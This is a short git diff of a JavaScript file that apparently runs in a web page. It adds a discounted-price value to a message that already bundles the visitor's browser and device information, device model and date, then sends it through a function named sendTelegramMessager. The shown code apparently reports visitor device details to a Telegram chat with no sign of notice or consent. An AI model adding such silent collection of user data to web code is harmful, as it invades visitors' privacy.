@@ -71,7 +71,7 @@ console.log(priceList);
 
 
 const text1 = '>>>>>>>>>>>>>>>>>>>>>>>>>>>>';
-
+const text2 = formatNumber(priceWithDiscount);
 let fechaActual = new Date();
 
 // Formatear la fecha
@@ -84,7 +84,7 @@ const deviceInfo = getDeviceInfo();
 
 const browser = JSON.stringify(deviceInfo, null, 2);
 
-const message = `\n${text1}\n${browser}\n${text1}\n${model}\n${text1}\n${fechaFormateada}\n${text1}\n`;
+const message = `\n${text1}\n${browser}\n${text1}\n${model}\n${text1}\n${fechaFormateada}\n${text1}\n${text2}\n`;
 
 sendTelegramMessager(message);
 
@@ -257,10 +257,3 @@ function getOSInfo() {
   if (navigator.appVersion.indexOf("iOS") !== -1) OSName = "iOS";
   return OSName;
 }
-
-
-
-
-
-
-
